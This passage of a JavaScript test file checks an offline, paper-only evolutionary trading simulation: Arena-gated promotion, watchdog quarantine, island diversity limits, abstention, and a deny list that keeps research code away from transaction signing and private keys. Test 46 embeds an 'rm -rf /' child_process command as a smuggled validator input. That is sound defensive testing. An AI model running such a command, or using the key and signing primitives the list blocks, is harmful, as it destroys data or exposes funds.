    const forbidden = memory.filter((r) => [MEMORY_STATUS.PROMISING, MEMORY_STATUS.ARENA_SURVIVOR, MEMORY_STATUS.SHADOW_ELIGIBLE].includes(r.status));
    assertEqual(forbidden.length, 0, "no research-cycle-authored memory record may claim a promoted status");
  });
});

test("42. Promotion only happens from a real Arena leaderboard match (by genome digest), and never for a QUARANTINED family", async () => {
  await withTempRoot(async (root) => {
    const genomeA = { riskFraction: 0.11 };
    const genomeB = { riskFraction: 0.12 };
    await saveCompiledCandidate(root, { familyId: "F-promote-a", proposalId: "P-a", genome: genomeA, authorRole: "signal-researcher" });
    await saveCompiledCandidate(root, { familyId: "F-promote-b", proposalId: "P-b", genome: genomeB, authorRole: "risk-researcher" });

    const quarantinedRecord = createMemoryRecord({ proposalId: "P-b", authorRole: "risk-researcher", hypothesis: "h", candidateFamily: "F-promote-b", status: MEMORY_STATUS.TESTING });
    quarantinedRecord.watchdogVerdict = "QUARANTINED";
    await appendMemoryRecord(root, quarantinedRecord);

    const leaderboardRows = [
      { digest: digestOf(genomeA), status: "DEPLOYMENT CANDIDATE" },
      { digest: digestOf(genomeB), status: "DEPLOYMENT CANDIDATE" },
    ];
    const memoryRecords = await readMemoryIndex(root, { limit: 100 });
    const result = await promoteFromArenaLeaderboard({ root, leaderboardRows, memoryRecords });

    assert(result.promoted.some((p) => p.familyId === "F-promote-a" && p.to === MEMORY_STATUS.SHADOW_ELIGIBLE), "a matched, non-quarantined family must be promoted to SHADOW_ELIGIBLE");
    assert(result.skipped.some((s) => s.familyId === "F-promote-b"), "a quarantined family must never be promoted even with a matching leaderboard digest");
    assert(isQuarantined(memoryRecords, "F-promote-b"), "isQuarantined must detect the quarantine flag");
  });
});

test("43. A compiled candidate with no matching Arena leaderboard entry is skipped, not promoted", async () => {
  await withTempRoot(async (root) => {
    await saveCompiledCandidate(root, { familyId: "F-unmatched", proposalId: "P-unmatched", genome: { riskFraction: 0.05 }, authorRole: "signal-researcher" });
    const result = await promoteFromArenaLeaderboard({ root, leaderboardRows: [{ digest: "some-other-digest", status: "DEPLOYMENT CANDIDATE" }], memoryRecords: [] });
    assertEqual(result.promoted.length, 0, "no promotion may occur without a genome-digest match");
    assertEqual(result.skipped.length, 1, "the unmatched candidate must be reported as skipped");
  });
});

/* ============================================================================
 * 8. Researchers cannot alter Arena gates, scoring, or the paper-only guard
 * ==========================================================================*/

test("44. DEFAULT_DEPLOYMENT_GATES and ARENA_SCORE_VERSION are untouched by anything Phase 5A adds", () => {
  assert(DEFAULT_DEPLOYMENT_GATES && typeof DEFAULT_DEPLOYMENT_GATES === "object", "deployment gates must still exist");
  assertFinite(ARENA_SCORE_VERSION, "arena score version must still be a finite version number");
  assert(Object.isFrozen(DEFAULT_DEPLOYMENT_GATES), "deployment gates must remain frozen (no research module can mutate them)");
});

test("45. PAPER_ONLY remains true and no research module imports execution/signing primitives", async () => {
  assertEqual(PAPER_ONLY, true, "the paper-only guard must remain true");

  const FORBIDDEN_PATTERNS = [
    /sendTransaction/i,
    /sendRawTransaction/i,
    /signTransaction/i,
    /signAllTransactions/i,
    /partialSign/i,
    /fromSecretKey/i,
    /secretKey/i,
    /privateKey/i,
    /seedPhrase/i,
    /mnemonic/i,
    /wallet-adapter/i,
    /@solana\/web3\.js/i,
    /@solana\/kit/i,
    /new\s+Connection\s*\(/,
    /new\s+Transaction\s*\(/,
    /SystemProgram/i,
    /jup\.ag\/swap/i,
    /\/swap\/build/i,
    /swap-instructions/i,
    /broadcastTransaction/i,
  ];

  const projectRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
  const targets = [path.join(projectRoot, "scripts", "research"), path.join(projectRoot, "scripts", "engine", "islands.mjs"), path.join(projectRoot, "scripts", "engine", "families.mjs")];
  const findings = [];

  async function walk(dir) {
    let entries;
    try {
      entries = await readdir(dir, { withFileTypes: true });
    } catch {
      return; // a single-file target
    }
    for (const entry of entries) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        await walk(full);
        continue;
      }
      if (!/\.mjs$/.test(entry.name)) continue;
      const text = await readFile(full, "utf8");
      for (const pattern of FORBIDDEN_PATTERNS) {
        if (pattern.test(text)) findings.push(`${full} matched ${pattern}`);
      }
      if (/\bfetch\s*\(/.test(text)) findings.push(`${full} performs a network fetch — research machinery must stay offline`);
    }
  }

  for (const target of targets) {
    const text = await readFile(target, "utf8").catch(() => null);
    if (text !== null) {
      for (const pattern of FORBIDDEN_PATTERNS) if (pattern.test(text)) findings.push(`${target} matched ${pattern}`);
      continue;
    }
    await walk(target);
  }

  assertEqual(findings.length, 0, `forbidden execution-path patterns found: ${findings.join("; ")}`);
});

test("46. Research proposals cannot smuggle a shell/eval string past validation via any string field", () => {
  const fields = ["hypothesis", "rationale"];
  for (const field of fields) {
    const { ok } = validateProposal(validProposal({ [field]: "require('child_process').exec('rm -rf /') plus enough padding text here" }));
    assert(!ok, `an executable string in ${field} must be rejected`);
  }
  const { ok } = validateProposal(validProposal({ risks: ["eval('1')"] }));
  assert(!ok, "an executable string inside risks[] must be rejected");
});

/* ============================================================================
 * 9. ACTIVE / REDUCED_RISK / ABSTAIN
 * ==========================================================================*/

test("47. abstentionDecision is deterministic and regime-driven (ACTIVE / REDUCED_RISK / ABSTAIN)", () => {
  const active = abstentionDecision({ regime: "strong-risk-on", allowNewEntries: true, hasPosition: false, eligibleCount: 5, abstainRegimes: [] });
  assertEqual(active.state, ABSTAIN_STATE.ACTIVE, "a favorable regime with no declared abstention must be ACTIVE");

  const reduced = abstentionDecision({ regime: "high-volatility", allowNewEntries: true, hasPosition: false, eligibleCount: 5, abstainRegimes: [] });
  assertEqual(reduced.state, ABSTAIN_STATE.REDUCED_RISK, "high-volatility must reduce risk");

  const abstained = abstentionDecision({ regime: "broad-selloff", allowNewEntries: true, hasPosition: false, eligibleCount: 0, abstainRegimes: [] });
  assertEqual(abstained.state, ABSTAIN_STATE.ABSTAIN, "broad-selloff with no eligible token must abstain");

  const declared = abstentionDecision({ regime: "launch-heavy", allowNewEntries: true, hasPosition: false, eligibleCount: 5, abstainRegimes: ["launch-heavy"] });
  assertEqual(declared.state, ABSTAIN_STATE.ABSTAIN, "a declared abstain regime must be honored");

  assertEqual(riskMultiplierFor(ABSTAIN_STATE.ABSTAIN), 0, "ABSTAIN must zero out position size");
  assertEqual(riskMultiplierFor(ABSTAIN_STATE.REDUCED_RISK), 0.5, "REDUCED_RISK must halve position size");
  assertEqual(riskMultiplierFor(ABSTAIN_STATE.ACTIVE), 1, "ACTIVE must not scale position size");
});

test("48. A research candidate's abstention state is present, deterministic, and reproducible for the same seed/regime sequence", async () => {
  const runOnce = async () => {
    const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
    const random = createSeededRandom("abstain-determinism");
    let clock = 1_760_000_000_000;
    const now = () => clock;
    const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
    const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });

    simulation.injectResearchCandidate({
      genome: randomGenome("Momentum", createSeededRandom("abstain-genome")),
      species: "Momentum",
      familyId: "F-abstain-test",
      proposalId: "P-abstain-test",
      authorRole: "risk-researcher",
      targetRegimes: [],
      abstainRegimes: ["broad-selloff", "high-volatility", "liquidity-contraction", "sideways-chop", "low-activity", "weak-risk-on"],
    });

    const postures = [];
    for (let i = 0; i < 20; i += 1) {
      await feed.advance(clock);
      clock += config.engine.tickMs;
      simulation.advanceTick();
      const agent = simulation.population.find((a) => a.researchMeta?.familyId === "F-abstain-test");
      postures.push(agent?.researchPosture ?? null);
    }
    return postures;
  };

  const a = await runOnce();
  const b = await runOnce();
  assertEqual(JSON.stringify(a), JSON.stringify(b), "the same seed and regime sequence must reproduce the same activation-state sequence (replay determinism)");
});

test("49. Abstention is scoped to research-declared candidates: an ordinary species agent's behavior is completely unaffected", async () => {
  const { snapshot: withoutResearch } = await runLiveSimulationGenerations({ populationSize: 48, generations: 2, generationTicks: 12, seedLabel: "scope-check" });
  const { snapshot: alsoWithoutResearch } = await runLiveSimulationGenerations({ populationSize: 48, generations: 2, generationTicks: 12, seedLabel: "scope-check" });
  assertEqual(JSON.stringify(withoutResearch.stats), JSON.stringify(alsoWithoutResearch.stats), "identical runs with no research candidates must be byte-identical (Phase 5A additions are a no-op without one)");
});

/* ============================================================================
 * 10. Shared market feed (population scaling does not multiply market traffic)
 * ==========================================================================*/

test("50. feed.markets() is called exactly once per tick regardless of population size (48 vs 192)", async () => {
  async function tickCountFor(populationSize) {
    const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: String(populationSize), EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
    const random = createSeededRandom(`shared-feed-${populationSize}`);
    let clock = 1_760_000_000_000;
    const now = () => clock;
    const realFeed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
    let calls = 0;
    const countingFeed = {
      ...realFeed,
      markets: (...args) => {
        calls += 1;
        return realFeed.markets(...args);
      },
    };
    const simulation = createSimulation({ config, feed: countingFeed, now, random, evolution: { enabled: true, ...config.evolution } });
    const ticks = 10;
    for (let i = 0; i < ticks; i += 1) {
      await realFeed.advance(clock);
      clock += config.engine.tickMs;
      simulation.advanceTick();
    }
    return calls;
  }

  const smallCalls = await tickCountFor(48);
  const largeCalls = await tickCountFor(192);
  assertEqual(smallCalls, largeCalls, "market-feed call count must be identical regardless of population size — the feed is fetched once per tick, not once per agent");
});

/* ============================================================================
 * 11. No NaN/Infinity, no look-ahead, output schema
 * ==========================================================================*/

test("51. A live run with islands + an injected research candidate contains no NaN/Infinity anywhere in the snapshot", async () => {
  const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
  const random = createSeededRandom("no-nonfinite-5a");
  let clock = 1_760_000_000_000;
  const now = () => clock;
  const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
  const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });
  simulation.injectResearchCandidate({
    genome: randomGenome("Liquidity", random),
    species: "Liquidity",
    familyId: "F-finite-check",
    proposalId: "P-finite-check",
    authorRole: "diversity-researcher",
    targetRegimes: ["low-activity"],
    abstainRegimes: ["broad-selloff"],
  });
  for (let i = 0; i < 60; i += 1) {
    await feed.advance(clock);
    clock += config.engine.tickMs;
    simulation.advanceTick();
  }
  assertNoNonFinite(simulation.snapshot(), "snapshot");
  const evidence = simulation.getResearchEvidence();
  assertNoNonFinite(evidence, "researchEvidence");
});

test("52. Every REGIMES member is a valid string and 'unknown' is never offered to researchers as a target", () => {
  for (const regime of REGIMES) assert(typeof regime === "string" && regime.length > 0, "every regime must be a non-empty string");
  assert(!REGIMES.includes("unknown"), "'unknown' is the classifier's no-data sentinel and must never be a proposable regime");
});

test("53. getResearchEvidence / clearResearchEvidence round-trip: culled research candidates keep their final evidence until cleared", async () => {
  const config = createMarketConfig({ EVOLVE_MARKET_MODE: "synthetic", EVOLVE_POPULATION_SIZE: "48", EVOLVE_GENERATION_TICKS: "8", EVOLVE_SYNTHETIC_UNIVERSE: "16" }, { loadEnv: false });
  const random = createSeededRandom("evidence-roundtrip");
  let clock = 1_760_000_000_000;
  const now = () => clock;
  const feed = createMarketFeed({ config, fetchImpl: async () => { throw new Error("offline"); }, now, random });
  const simulation = createSimulation({ config, feed, now, random, evolution: { enabled: true, ...config.evolution } });
  simulation.injectResearchCandidate({
    genome: randomGenome("Reversal", random),
    species: "Reversal",
    familyId: "F-evidence-roundtrip",
    proposalId: "P-evidence-roundtrip",
    authorRole: "execution-researcher",
  });
  for (let i = 0; i < 40; i += 1) {
    await feed.advance(clock);
    clock += config.engine.tickMs;
    simulation.advanceTick();
  }
  const evidence = simulation.getResearchEvidence();
  assert(Array.isArray(evidence), "getResearchEvidence must return an array");
  const ids = evidence.map((e) => e.familyId);
  simulation.clearResearchEvidence(ids);
  // Clearing evidence for candidates that are still alive must not error, and
  // a subsequent read must still find the alive ones (they re-derive live).
  const after = simulation.getResearchEvidence();
  assertNoNonFinite(after, "researchEvidenceAfterClear");
});

/* ============================================================================
 * 12. Phase 5A.1 — soft diversity-protected islands
 *    (no hard equal quotas; evidence-weighted, inertia-bounded, floored/capped)
 * ==========================================================================*/

test("54. Islands initialize approximately evenly at 192 (about 32 each) with explicit soft floor and cap", async () => {
  const { simulation } = await offlineSimulation({ populationSize: 192, seedLabel: "init-islands-192" });
  const snapshot = simulation.snapshot();
  const policy = islandDiversityPolicy(192, SPECIES, {});

  assertEqual(snapshot.islands.length, SPECIES.length, "there must be one island per species");
  assertEqual(snapshot.islands.reduce((sum, island) => sum + island.population, 0), 192, "islands must sum to the population");
  for (const island of snapshot.islands) {
    assert(
      Math.abs(island.population - 32) <= 1,
      `initialization must be approximately 32 per island, got ${island.name} ${island.population}`,
    );
    assertEqual(island.floor, policy.floor, `island ${island.name} must report the diversity floor`);
    assertEqual(island.cap, policy.cap, `island ${island.name} must report the monoculture cap`);
    assert(island.floor > 0 && island.cap > island.floor, "the floor and cap must be real, distinct bounds");
    assert(island.cap < 192, "the cap must be a genuine ceiling, not the whole population");
  }
  assertEqual(policy.floor, 15, "the default floor at 192 is 8% of the population");
  assertEqual(policy.cap, 58, "the default cap at 192 is 30% of the population");
});

test("55. Population stays exactly 192 for many generations while islands diverge from 32 each", async () => {
  const { simulation, advance } = await offlineSimulation({ populationSize: 192, generationTicks: 10, seedLabel: "diverge-192" });
  const policy = islandDiversityPolicy(192, SPECIES, {});
  await advance(10 * 30);

  const snapshot = simulation.snapshot();
  assertEqual(snapshot.islands.reduce((sum, island) => sum + island.population, 0), 192, "island populations must sum to exactly 192");
  assertEqual(snapshot.stats.alive, 192, "alive must stay exactly 192");
  assertEqual(snapshot.stats.bornTotal - snapshot.stats.terminatedTotal, 192, "born - terminated must equal the population");

  const distinct = new Set(snapshot.islands.map((island) => island.population));
  assert(distinct.size > 1, "island populations must be able to differ from one another after evolution");
  assert(
    snapshot.islands.some((island) => island.population !== 32),
    "soft islands must not snap back to a hard 32/32/32/32/32/32 quota",
  );

  for (const island of snapshot.islands) {
    assert(island.population >= policy.floor, `${island.name} (${island.population}) fell below the diversity floor ${policy.floor}`);
    assert(island.population <= policy.cap, `${island.name} (${island.population}) exceeded the cap ${policy.cap}`);
    assertFinite(island.share, `${island.name} share`);
    assertFinite(island.medianFitness, `${island.name} median fitness`);
    assertFinite(island.meanFitness, `${island.name} mean fitness`);
    assertFinite(island.paperReturn, `${island.name} paper return`);
    assert(Number.isInteger(island.trades), `${island.name} trades must be an integer`);
    assert(Number.isInteger(island.births) && Number.isInteger(island.deaths), `${island.name} births/deaths must be integers`);
    assertFinite(island.softTarget, `${island.name} soft target`);
    assertFinite(island.reproductiveWeight, `${island.name} reproductive weight`);
  }
  const shareSum = snapshot.islands.reduce((sum, island) => sum + island.share, 0);
  assert(Math.abs(shareSum - 1) < 1e-6, `island shares must sum to 1, got ${shareSum}`);
});

test("56. A stronger, better-evidenced island earns more weight, a larger soft target, and more births than a weak one", () => {
  const [strong, ...weakNames] = SPECIES;
  const policy = islandDiversityPolicy(192, SPECIES, {});
  const stats = { [strong]: { population: 32, evidenceSufficientCount: 32, medianFitness: 9 } };
  for (const name of weakNames) stats[name] = { population: 32, evidenceSufficientCount: 32, medianFitness: -9 };
  const weights = islandReproductiveWeights(stats, {});

  for (const name of weakNames) {
    assert(weights[strong] > weights[name], `the evidence-backed island must outweigh ${name}`);
  }

  const startCounts = Object.fromEntries(SPECIES.map((name) => [name, 32]));
  const targets = islandSoftTargets({ startCounts, weights, total: 192, floor: policy.floor, cap: policy.cap, maxShareDelta: policy.maxShareDelta });
  assert(targets[strong] > 32, "the evidence-backed island must be aimed above its starting share");
  for (const name of weakNames) {
    assert(targets[strong] > targets[name], `the evidence-backed island must out-target ${name}`);
    assert(targets[name] < 32, `${name} must be aimed below its starting share`);
  }

  const counts = Object.fromEntries(SPECIES.map((name) => [name, 14]));
  const births = allocateIslandBirths({ counts, targets, weights, birthsNeeded: 120, floor: policy.floor, cap: policy.cap });
  for (const name of weakNames) {
    assert(births[strong] > births[name], `the stronger island must receive more births than ${name}`);
  }
  assertEqual(Object.values(births).reduce((a, b) => a + b, 0), 120, "the birth budget must still be delivered exactly");
});

test("57. One lucky, low-evidence agent cannot hand its island the population (evidence damping + bounded movement)", () => {
  const base = ISLAND_DIVERSITY_DEFAULTS.baseWeight;

  const luckyOnly = islandEvidenceWeight({ population: 1, evidenceSufficientCount: 0, medianFitness: 1_000_000 });
  assert(Math.abs(luckyOnly - base) < 1e-9, "an island with no sufficient evidence must earn no fitness advantage at all");

  const barelyEvidenced = islandEvidenceWeight({ population: 32, evidenceSufficientCount: 1, medianFitness: 1_000_000 });
  const wellEvidenced = islandEvidenceWeight({ population: 32, evidenceSufficientCount: 32, medianFitness: 9 });
  assert(
    barelyEvidenced < base * 1.1,
    `1/n evidence may only buy a negligible advantage, got ${barelyEvidenced} vs base ${base}`,
  );
  assert(wellEvidenced > base * 1.5, "a fully-evidenced strong island must be able to earn a large advantage");

  const policy = islandDiversityPolicy(192, ["Lucky", "Other"], {});
  const targets = islandSoftTargets({
    startCounts: { Lucky: 32, Other: 32 },
    weights: { Lucky: 1e9, Other: 1 },
    total: 192,
    floor: policy.floor,
    cap: policy.cap,
    maxShareDelta: policy.maxShareDelta,
  });
  const step = Math.round(192 * policy.maxShareDelta);
  assert(targets.Lucky <= 32 + step, `one generation may move an island by at most ${step} agents, got ${targets.Lucky - 32}`);
  assert(targets.Lucky <= policy.cap, "the soft target must never exceed the cap even under overwhelming weight");
});

test("58. The diversity floor protects an island from being starved out while births are available", () => {
  const policy = islandDiversityPolicy(192, SPECIES, {});
  const counts = { A: 2, B: 40, C: 40, D: 40, E: 40, F: 30 };
  const weights = { A: 0.0001, B: 1, C: 1, D: 1, E: 1, F: 1 };

  const protectedBirths = allocateIslandBirths({
    counts,
    targets: counts,
    weights,
    birthsNeeded: 60,
    floor: policy.floor,
    cap: policy.cap,
  });
  assert(protectedBirths.A >= policy.floor - 2, `the floored island must be filled to its floor, got ${protectedBirths.A}`);
  assertEqual(Object.values(protectedBirths).reduce((a, b) => a + b, 0), 60, "births must still sum exactly to the budget");

  const unfloored = allocateIslandBirths({ counts, targets: counts, weights, birthsNeeded: 2, floor: 0, cap: policy.cap });
  assertEqual(unfloored.A ?? 0, 0, "with the floor disabled a starved island can receive no births at all (extinction possible)");
  assertEqual(Object.values(unfloored).reduce((a, b) => a + b, 0), 2, "the budget must still be delivered exactly");
  assert(unfloored.B >= 1, "with the floor disabled births follow the evidence weight alone");
});

test("59. The monoculture cap is respected by the allocation and by a live 192-agent run", async () => {
  const policy = islandDiversityPolicy(192, SPECIES, {});
  const counts = { A: 30, B: 30, C: 30, D: 30, E: 30, F: 30 };
  const births = allocateIslandBirths({
    counts,
    targets: { A: 58, B: 58, C: 58, D: 58, E: 58, F: 58 },
    weights: { A: 1e6, B: 1, C: 1, D: 1, E: 1, F: 1 },
    birthsNeeded: 12,
    floor: policy.floor,
    cap: policy.cap,
  });
  assert(counts.A + births.A <= policy.cap, `the dominant island must not exceed the cap, got ${counts.A + births.A}`);
  assertEqual(Object.values(births).reduce((a, b) => a + b, 0), 12, "births must sum exactly even when the cap binds");

  const { simulation, advance } = await offlineSimulation({ populationSize: 192, generationTicks: 10, seedLabel: "cap-live-192" });
  await advance(10 * 20);
  const snapshot = simulation.snapshot();
  for (const island of snapshot.islands) {
    assert(!island.overCap, `${island.name} reported overCap=${island.overCap} at ${island.population} (cap ${island.cap})`);
    assert(island.population <= policy.cap, `${island.name} exceeded the population cap in a live run`);
  }
});

test("60. Migration, random immigration, and research injection never break the global population", async () => {
  const { simulation, advance } = await offlineSimulation({
    populationSize: 192,
    generationTicks: 12,
    envOverrides: { EVOLVE_ISLAND_MIGRATION_RATE: "1", EVOLVE_ISLAND_MAX_MIGRATIONS: "10000", EVOLVE_RANDOM_IMMIGRANT_RATE: "0.25" },
    seedLabel: "population-invariants",
  });
  simulation.injectResearchCandidate({
    genome: randomGenome("Momentum", createSeededRandom("population-invariant-genome")),
    species: "Momentum",
    familyId: "F-population-invariant",
    proposalId: "P-population-invariant",
    authorRole: "signal-researcher",
    targetRegimes: ["weak-risk-on"],
    abstainRegimes: [],
  });

  for (let generation = 0; generation < 25; generation += 1) {
    await advance(12);
    const snapshot = simulation.snapshot();
    assertEqual(snapshot.stats.alive, 192, `alive must stay exactly 192 (generation ${snapshot.generation})`);
    assertEqual(
      snapshot.islands.reduce((sum, island) => sum + island.population, 0),
      192,
      `island populations must sum to 192 (generation ${snapshot.generation})`,
    );
    assertEqual(
      snapshot.stats.bornTotal - snapshot.stats.terminatedTotal,
      192,
      `born - terminated must equal the population (generation ${snapshot.generation})`,
    );
  }
});

test("61. A starved island can go extinct and be revived; the whole bookkeeping stays consistent", async () => {
  // `Momentum:2` pins one island's *base weight* far below the others and the
  // diversity floor is disabled, so that island is genuinely starved out and
  // then re-seeded by the pre-existing revival rule — exactly the extinction
  // path the new diversity floor is there to protect against.
  const { simulation, advance } = await offlineSimulation({
    populationSize: 48,
    generationTicks: 10,
    envOverrides: {
      EVOLVE_ISLAND_MIN_SHARE: "0",
      EVOLVE_ISLAND_TARGETS: "Momentum:2",
      EVOLVE_ISLAND_REVIVE_EXTINCT: "true",
      EVOLVE_ISLAND_MIGRATION_RATE: "0",
    },
    seedLabel: "extinction-accounting",
  });

  let sawRevival = 0;
  for (let generation = 0; generation < 30; generation += 1) {
    await advance(10);
    const snapshot = simulation.snapshot();
    assertEqual(snapshot.stats.alive, 48, `alive must stay exactly 48 (generation ${snapshot.generation})`);
    assertEqual(
      snapshot.islands.reduce((sum, island) => sum + island.population, 0),
      48,
      `islands must still sum to the population (generation ${snapshot.generation})`,
    );
    assertEqual(
      snapshot.stats.bornTotal - snapshot.stats.terminatedTotal,
      48,
      `born - terminated must equal the population (generation ${snapshot.generation})`,
    );
    for (const island of snapshot.islands) {
      assert(Number.isInteger(island.revivals) && island.revivals >= 0, `${island.name} revivals must be a non-negative integer`);
      assert(
        Number.isInteger(island.extinctionEvents) && island.extinctionEvents >= 0,
        `${island.name} extinction events must be a non-negative integer`,
      );
      assert(island.revivals === 0 || island.population > 0, "a revived island must actually be populated again");
      assert(island.population >= 0 && island.population <= island.cap, `${island.name} must stay within its cap`);
    }
    if (snapshot.islands.reduce((sum, island) => sum + island.revivals, 0) > 0) sawRevival += 1;
  }

  assert(sawRevival > 0, "at least one island must have gone extinct and been revived with the floor disabled");
  assert(simulation.population.length === 48, "the population must be exact after every revival");
});

/* ============================================================================
 * 13. Phase 5A.1 — machine-readable watchdog evidence in research memory
 * ==========================================================================*/

async function runWatchdogMemoryCycle(root, { trades = 6, minTrades = 8, cycle = 1, evidenceOverrides = {} } = {}) {
  const evidence = buildEvidencePacket({
    snapshot: { species: [], researchRegime: "weak-risk-on", topAgents: [], paper: { costs: 0, startingCash: 100 }, stats: { population: 48 } },
    islands: [],
    priorConclusions: [],
    cycle,
  });
  return runResearchCycle({
    root,
    evidence,
    cycle,
    seed: "watchdog-memory",
    proposalsPerCycle: 6,
    maxCompilations: 0,
    watchThresholds: { minTrades },
    pendingEvidence: [
      {
        familyId: "F-watchdog-memory",
        proposalId: "P-watchdog-memory",
        authorRole: "execution-researcher",
        hypothesis: "churn reduction hypothesis",
        trades,
        distinctMints: 1,
        mintNotional: { mintA: 100 },
        costDrag: 0.5,
        trainReturn: 0.5,
        oosReturn: 0.01,
        stressTotal: 2,
        stressSurvived: 0,
        alive: false,
        ...evidenceOverrides,
      },
    ],
  });
}

/** A clean, well-evidenced candidate: no watchdog flag should fire. */
const CLEAN_WATCHDOG_EVIDENCE = Object.freeze({
  trades: 40,
  distinctMints: 5,
  mintNotional: { a: 22, b: 21, c: 20, d: 19, e: 18 },
  costDrag: 0.01,
  trainReturn: null,
  oosReturn: null,
  stressTotal: 0,
  stressSurvived: 0,
});

test("62. A research memory record exposes structured watchdog evidence and stays TESTING (append-only, Arena-gated promotion)", async () => {
  await withTempRoot(async (root) => {
    await runWatchdogMemoryCycle(root, { trades: 6, minTrades: 8 });
    const memory = await readMemoryIndex(root, { limit: 100 });
    const record = memory.find((entry) => entry.candidateFamily === "F-watchdog-memory");
    assert(record, "the watchdog-evaluated candidate must have a memory record");

    assertEqual(record.status, MEMORY_STATUS.TESTING, "a watchdog verdict must never promote or reject a record on its own");
    assert(record.watchdog && typeof record.watchdog === "object", "the record must carry a structured watchdog object");
    assertEqual(record.watchdog.status, WATCHDOG_VERDICT.QUARANTINED, "the structured status must be machine-readable");
    assert(Array.isArray(record.watchdog.reasons) && record.watchdog.reasons.length > 0, "the record must expose watchdog reasons");
    assert(
      record.watchdog.reasons.some((reason) => reason.includes("very-low-trade-count")),
      "the reasons must name the flags that produced the verdict",
    );
    assert(
      record.watchdog.flags.includes("very-low-trade-count"),
      "the machine-readable flag list must be queryable without parsing prose",
    );
    assertEqual(record.watchdog.tradeCount, 6, "the record must expose the trade count the verdict was based on");
    assert(typeof record.watchdog.evaluatedAt === "string", "the record must expose when it was evaluated");

    // Back-compatible flat aliases (promote.mjs' quarantine check reads these).
    assertEqual(record.watchdogVerdict, WATCHDOG_VERDICT.QUARANTINED, "watchdogVerdict must stay populated");
    assertEqual(record.watchdogStatus, WATCHDOG_VERDICT.QUARANTINED, "watchdogStatus must stay populated");
    assert(isQuarantined(memory, "F-watchdog-memory"), "a structured QUARANTINED verdict must still block promotion");

    // The human-readable conclusion is still there, but nothing machine-readable
    // depends on it.
    assert(record.conclusion.length > 0, "the human-readable conclusion must still be written");

    // Raw watchdog output normalizes into the same structured shape.
    const normalized = normalizeWatchdogEvidence({
      verdict: WATCHDOG_VERDICT.WATCH,
      flags: [{ flag: "high-cost-drag", detail: "cost drag 50% of bankroll" }],
      trades: 5,
      evaluatedAt: "2026-09-17T00:00:00.000Z",
    });
    assertEqual(normalized.status, WATCHDOG_VERDICT.WATCH, "a raw verdict must normalize to a structured status");
    assertEqual(normalized.flags[0], "high-cost-drag", "flag labels must be extracted from the raw flags");
    assert(normalized.reasons[0].includes("high-cost-drag"), "reasons must retain the flag label and detail");
    assertEqual(normalized.tradeCount, 5, "the normalization must carry the trade count");
    assertEqual(normalized.evaluatedAt, "2026-09-17T00:00:00.000Z", "the normalization must carry the evaluation time");
    assertEqual(normalizeWatchdogEvidence(null), null, "a candidate that was never screened must normalize to null");
  });
});

test("63. Watchdog evidence is queryable (status, reasons, trade count, evaluatedAt) without parsing conclusions", async () => {
  await withTempRoot(async (root) => {
    await runWatchdogMemoryCycle(root, { trades: 6, minTrades: 8, cycle: 1 });
    await runWatchdogMemoryCycle(root, { trades: 40, minTrades: 8, cycle: 2, evidenceOverrides: CLEAN_WATCHDOG_EVIDENCE });

    const quarantined = await readWatchdogEvaluations(root, { status: WATCHDOG_VERDICT.QUARANTINED });
    assertEqual(quarantined.length, 1, "a status filter must return exactly the quarantined evaluations");
    assertEqual(quarantined[0].candidateFamily, "F-watchdog-memory", "the evaluation must name the family it judged");
    assertEqual(quarantined[0].watchdog.tradeCount, 6, "the filtered evaluation must carry its trade count");

    const all = await readWatchdogEvaluations(root);
    assertEqual(all.length, 2, "every watchdog evaluation must be retrievable");
    assert(all.every((entry) => typeof entry.watchdog.status === "string"), "every evaluation must carry a structured status");

    const memory = await readMemoryIndex(root, { limit: 100 });
    const stats = watchdogStats({ memoryRecords: memory });
    assertEqual(stats.evaluated, 2, "the roll-up counts each evaluated record once");
    assertEqual(stats.QUARANTINED, 1, "the roll-up must count the QUARANTINED verdict");
    assertEqual(stats.NORMAL, 1, "the clean second evaluation must count as NORMAL");
    assert(typeof stats.lastEvaluatedAt === "string", "the roll-up must report the most recent evaluation time");

    const summary = summarizeResearchMemory({ memoryRecords: memory });
    assertEqual(summary.watchdog.evaluated, 2, "the memory summary must expose the watchdog roll-up");
    assert(summary.byRole["execution-researcher"] >= 2, "the memory summary must expose researcher-role counts");
  });
});

test("64. Conclusions carry the same structured watchdog evidence, and history stays append-only", async () => {
  await withTempRoot(async (root) => {
    await runWatchdogMemoryCycle(root, { trades: 6, minTrades: 8, cycle: 1 });
    const afterFirst = await readMemoryIndex(root, { limit: 100 });
    const firstRecord = afterFirst.find((entry) => entry.candidateFamily === "F-watchdog-memory");

    await runWatchdogMemoryCycle(root, { trades: 6, minTrades: 8, cycle: 2 });
    const afterSecond = await readMemoryIndex(root, { limit: 100 });
    const watchdogRecords = afterSecond.filter((entry) => entry.candidateFamily === "F-watchdog-memory");
    assertEqual(watchdogRecords.length, 2, "each evaluation must append a new record rather than rewriting one");

    const persistedFirst = afterSecond.find((entry) => entry.recordedAt === firstRecord.recordedAt);
    assert(persistedFirst, "the earlier record must still be present");
    assertEqual(persistedFirst.status, MEMORY_STATUS.TESTING, "an earlier record's status must never be rewritten in place");
    assertEqual(persistedFirst.watchdog.status, WATCHDOG_VERDICT.QUARANTINED, "an earlier record's evidence must be preserved");

    const conclusions = JSON.parse(await readFile(path.join(root, "conclusions.json"), "utf8"));
    const entries = Array.isArray(conclusions.entries) ? conclusions.entries : [];
    const evaluated = entries.filter((entry) => entry.watchdog && entry.watchdog.status === WATCHDOG_VERDICT.QUARANTINED);
    assertEqual(evaluated.length, 2, "conclusions must carry the structured verdict alongside the prose");
